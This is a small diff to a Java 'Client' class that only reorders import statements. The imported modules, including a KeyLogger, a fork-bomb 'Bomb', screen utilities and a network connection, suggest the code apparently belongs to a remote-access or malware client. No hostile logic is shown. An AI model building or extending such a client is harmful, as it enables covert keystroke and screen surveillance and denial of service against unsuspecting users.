@@ -1,10 +1,5 @@
 package app;
 
-import java.io.EOFException;
-import java.io.IOException;
-import java.net.Socket;
-import java.net.SocketException;
-
 import exception.ServerOfflineException;
 import keylogger.KeyLogger;
 import network.Connection;
@@ -13,6 +8,11 @@ import utils.ClientUtils;
 import utils.OsCheck;
 import utils.ScreenUtils;
 import utils.forkbomb.Bomb;
+
+import java.io.EOFException;
+import java.io.IOException;
+import java.net.Socket;
+import java.net.SocketException;
 
 public class Client {
     static Connection connection;
